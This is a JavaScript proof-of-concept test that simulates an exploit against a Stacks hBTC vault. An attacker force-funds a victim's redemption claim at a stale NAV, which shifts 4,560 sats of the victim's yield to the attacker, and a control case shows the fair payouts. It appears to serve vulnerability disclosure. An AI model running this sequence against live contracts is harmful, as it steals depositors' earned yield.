import assert from 'node:assert/strict';
import { initSimnet } from '@stacks/clarinet-sdk';
import { Cl, cvToString } from '@stacks/transactions';

const BASE = 100_000_000n;
const ATTACKER_SHARES = 60_000_000n;
const VICTIM_SHARES = 40_000_000n;
const STRATEGY_CAPITAL = 50_000_000n;
const GROSS_PROFIT = 12_000n; // 1.2 bps, below production 5/7 bps guards
const RF_FROM_PROFIT = 600n;  // live/source reserve-rate = 500 bps (5%)
const NET_HOLDER_YIELD = 11_400n;
const VICTIM_FAIR_YIELD = 4_560n;
const ATTACKER_FAIR_YIELD = 6_840n;
const SBTC = 'SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token';

const EXPECTED = {
  ATTACK: { victim: 40_000_000n, attacker: 60_011_400n },
  CONTROL: { victim: 40_004_560n, attacker: 60_006_840n },
};

async function runCase(mode) {
  const simnet = await initSimnet('tests/security/stale-nav/Clarinet.toml');
  const accounts = simnet.getAccounts();
  const deployer = accounts.get('deployer');
  const rewarder = accounts.get('wallet_1');
  const attacker = accounts.get('wallet_2');
  const victim = accounts.get('wallet_3');
  if (!deployer || !rewarder || !attacker || !victim) throw new Error('missing accounts');

  const c = n => `${deployer}.${n}`;
  const text = r => cvToString(r.result);
  const u = r => {
    const m = text(r).match(/(?:\(ok )?u(\d+)\)?/);
    if (!m) throw new Error(text(r));
    return BigInt(m[1]);
  };
  const pub = (n, fn, args, sender) => simnet.callPublicFn(c(n), fn, args, sender);
  const ro = (n, fn, args = [], sender = deployer) => simnet.callReadOnlyFn(c(n), fn, args, sender);
  const expect = (label, r, wanted) => {
    const got = text(r);
    console.log(`[${mode}] ${label}: ${got}`);
    assert.equal(got, wanted, `[${mode}] ${label}: expected ${wanted}, got ${got}`);
  };
  const sbtc = who => u(simnet.callReadOnlyFn(SBTC, 'get-balance-available', [Cl.principal(who)], deployer));
  const hbtc = who => u(ro('token-hbtc', 'get-balance', [Cl.principal(who)], who));

  const state = c('state');
  const vault = c('vault');
  const controller = c('controller-hbtc');
  const reserve = c('reserve');
  const helper = c('strategy-loss-helper');

  const requestRole = (fn, address) => expect(fn, pub('hq-hbtc', fn, [Cl.principal(address), Cl.bool(true)], deployer), '(ok true)');
  const confirmRole = (fn, address) => expect(fn, pub('hq-hbtc', fn, [Cl.principal(address)], deployer), '(ok true)');

  for (const address of [state, vault, controller, reserve, helper]) requestRole('request-protocol-update', address);
  requestRole('request-rewarder-update', rewarder);
  expect('request sBTC asset', pub('state', 'request-asset-add', [Cl.principal(SBTC), Cl.buffer(new Uint8Array(32)), Cl.uint(8), Cl.uint(500), Cl.bool(false)], deployer), '(ok true)');
  // Match the current live hBTC fee configuration: management/performance fees are 0.
  expect('request performance fee 0', pub('state', 'request-perf-fee-update', [Cl.uint(0)], deployer), '(ok true)');

  simnet.mineEmptyBlocks(200);
  for (const address of [state, vault, controller, reserve, helper]) confirmRole('confirm-protocol-request', address);
  confirmRole('confirm-rewarder-request', rewarder);
  expect('confirm sBTC asset', pub('state', 'confirm-asset-request', [Cl.principal(SBTC)], deployer), '(ok true)');
  expect('confirm performance fee 0', pub('state', 'confirm-perf-fee-request', [], deployer), '(ok true)');
  expect('deposit cap', pub('state', 'set-deposit-cap', [Cl.uint(2n * BASE)], deployer), '(ok true)');

  expect('max-reward production default', ro('state', 'get-max-reward'), 'u5');
  expect('max-deviation production default', ro('state', 'get-max-deviation'), 'u7');
  expect('reserve-rate production default', ro('state', 'get-reserve-rate'), 'u500');
  expect('performance fee live-like value', ro('state', 'get-perf-fee'), 'u0');
  expect('management fee live-like value', ro('state', 'get-mgmt-fee'), 'u0');

  for (const [who, amount] of [[attacker, ATTACKER_SHARES], [victim, VICTIM_SHARES]]) {
    const r = simnet.callPrivateFn(SBTC, 'protocol-mint-many-iter', [Cl.tuple({ amount: Cl.uint(amount), recipient: Cl.principal(who) })], deployer);
    assert.equal(text(r), '(ok true)');
  }

  expect('attacker deposit 0.60', pub('vault', 'deposit', [Cl.uint(ATTACKER_SHARES), Cl.none()], attacker), '(ok u60000000)');
  expect('victim deposit 0.40', pub('vault', 'deposit', [Cl.uint(VICTIM_SHARES), Cl.none()], victim), '(ok u40000000)');

  // Victim independently requests a normal redemption. The claim is mature before
  // the adverse ordering starts; attacker has no role and does not control the claim.
  expect('victim request standard redeem', pub('vault', 'request-redeem', [Cl.uint(VICTIM_SHARES), Cl.bool(false)], victim), '(ok u1)');
  simnet.mineEmptyBlocks(500);
  assert.equal(hbtc(victim), 0n);
  assert.equal(hbtc(attacker), ATTACKER_SHARES);

  // Half the backing is physically deployed externally, leaving enough normal Reserve
  // liquidity to fund the victim claim without any later depositor.
  expect('deploy 0.50 sBTC to strategy', pub('strategy-loss-helper', 'pull-from-reserve', [Cl.uint(STRATEGY_CAPITAL)], deployer), '(ok true)');
  expect('fresh zero NAV log', pub('controller-hbtc', 'log-reward', [Cl.uint(0), Cl.bool(true)], rewarder), '(ok true)');
  const freshTs = u(ro('state', 'get-last-log-ts'));
  expect('PR137 timestamp guard says fresh', ro('pr137-shadow', 'is-sp-stale', [Cl.uint(freshTs)]), 'false');

  // Represent already-realized external strategy profit. This changes physical strategy
  // assets only; hBTC accounting remains unchanged until controller.log-reward succeeds.
  const profitMint = simnet.callPrivateFn(SBTC, 'protocol-mint-many-iter', [Cl.tuple({ amount: Cl.uint(GROSS_PROFIT), recipient: Cl.principal(helper) })], deployer);
  assert.equal(text(profitMint), '(ok true)');
  console.log(`[${mode}] external strategy realizes +${GROSS_PROFIT} sats profit`);
  expect('PR137 still says fresh after realized profit', ro('pr137-shadow', 'is-sp-stale', [Cl.uint(freshTs)]), 'false');
  expect('immediate +1.2bp profit accounting blocked only by update-window', pub('controller-hbtc', 'log-reward', [Cl.uint(GROSS_PROFIT), Cl.bool(true)], rewarder), '(err u102011)');

  let victimPayout;
  if (mode === 'ATTACK') {
    // Attacker is merely the remaining hBTC holder. fund-claim is permissionless after
    // cooldown, so attacker can force the victim to lock the stale pre-profit price.
    const beforeVictim = sbtc(victim);
    expect('attacker force-funds victim at stale NAV', pub('vault', 'fund-claim', [Cl.uint(1)], attacker), '(ok u40000000)');
    expect('victim redeems stale-funded claim', pub('vault', 'redeem', [Cl.uint(1)], attacker), '(ok u40000000)');
    victimPayout = sbtc(victim) - beforeVictim;

    simnet.mineEmptyBlocks(200);
    expect('later recognize the same realized +1.2bp profit', pub('controller-hbtc', 'log-reward', [Cl.uint(GROSS_PROFIT), Cl.bool(true)], rewarder), '(ok true)');
  } else {
    // Counterfactual: the exact same profit is recognized before anyone funds the claim.
    simnet.mineEmptyBlocks(200);
    expect('recognize +1.2bp profit before claim funding', pub('controller-hbtc', 'log-reward', [Cl.uint(GROSS_PROFIT), Cl.bool(true)], rewarder), '(ok true)');
    const beforeVictim = sbtc(victim);
    expect('fund victim at corrected NAV', pub('vault', 'fund-claim', [Cl.uint(1)], attacker), '(ok u40004560)');
    expect('victim redeems corrected claim', pub('vault', 'redeem', [Cl.uint(1)], attacker), '(ok u40004560)');
    victimPayout = sbtc(victim) - beforeVictim;
  }

  // Return all strategy principal + realized profit to Reserve. This changes only
  // physical liquidity location; accounting already contains the same gross profit.
  expect('return strategy principal + profit', pub('strategy-loss-helper', 'return-to-reserve', [Cl.uint(STRATEGY_CAPITAL + GROSS_PROFIT)], deployer), '(ok true)');

  // Remaining attacker now exits too, converting the yield reallocation into actual
  // wallet-level sBTC payouts rather than a mark-to-market comparison.
  expect('attacker request final redeem', pub('vault', 'request-redeem', [Cl.uint(ATTACKER_SHARES), Cl.bool(false)], attacker), '(ok u2)');
  simnet.mineEmptyBlocks(500);
  const beforeAttacker = sbtc(attacker);
  const expectedAttacker = mode === 'ATTACK' ? '(ok u60011400)' : '(ok u60006840)';
  expect('fund attacker at final NAV', pub('vault', 'fund-claim', [Cl.uint(2)], attacker), expectedAttacker);
  expect('attacker actual token redeem', pub('vault', 'redeem', [Cl.uint(2)], attacker), expectedAttacker);
  const attackerPayout = sbtc(attacker) - beforeAttacker;

  assert.equal(victimPayout, EXPECTED[mode].victim);
  assert.equal(attackerPayout, EXPECTED[mode].attacker);
  assert.equal(sbtc(reserve), RF_FROM_PROFIT, 'only the pending Reserve Fund allocation should remain');

  return { victimPayout, attackerPayout, totalUserPayout: victimPayout + attackerPayout };
}

console.log('=== HIGH IMPACT A/B: post-log positive PnL + permissionless force-funding ===');
const attack = await runCase('ATTACK');
const control = await runCase('CONTROL');

const victimShortfall = control.victimPayout - attack.victimPayout;
const attackerExcess = attack.attackerPayout - control.attackerPayout;

console.log('\n=== TOKEN-LEVEL RESULT ===');
console.log(`gross realized profit:    ${GROSS_PROFIT}`);
console.log(`RF allocation:            ${RF_FROM_PROFIT}`);
console.log(`net holder yield:         ${NET_HOLDER_YIELD}`);
console.log(`victim fair yield:        ${VICTIM_FAIR_YIELD}`);
console.log(`attacker fair yield:      ${ATTACKER_FAIR_YIELD}`);
console.log(`attack victim payout:     ${attack.victimPayout}`);
console.log(`control victim payout:    ${control.victimPayout}`);
console.log(`victim yield shortfall:   ${victimShortfall}`);
console.log(`attack attacker payout:   ${attack.attackerPayout}`);
console.log(`control attacker payout:  ${control.attackerPayout}`);
console.log(`attacker excess yield:    ${attackerExcess}`);
console.log(`attack total payouts:     ${attack.totalUserPayout}`);
console.log(`control total payouts:    ${control.totalUserPayout}`);

assert.equal(VICTIM_FAIR_YIELD + ATTACKER_FAIR_YIELD, NET_HOLDER_YIELD);
assert.equal(victimShortfall, VICTIM_FAIR_YIELD);
assert.equal(attackerExcess, VICTIM_FAIR_YIELD);
assert.equal(victimShortfall, attackerExcess);
assert.equal(attack.totalUserPayout, control.totalUserPayout);
assert.equal(attack.totalUserPayout, BASE + NET_HOLDER_YIELD);

console.log('PASS HIGH POSITIVE-PNL FORCE-FUNDING A/B: with the same users, same 1.2bps already-realized external profit, unchanged 5bps max-reward / 7bps max-deviation / 5% reserve-rate, and the same aggregate user payout, a remaining holder can permissionlessly fund a mature victim claim while the fresh-log update window forces NAV to remain stale. The victim receives exactly 4,560 sats less already-earned yield than in the reconciled control, and the attacker later receives exactly 4,560 sats more actual sBTC. This is a zero-sum theft of unclaimed yield, not principal loss, rounding, fee extraction, or protocol-created value.');
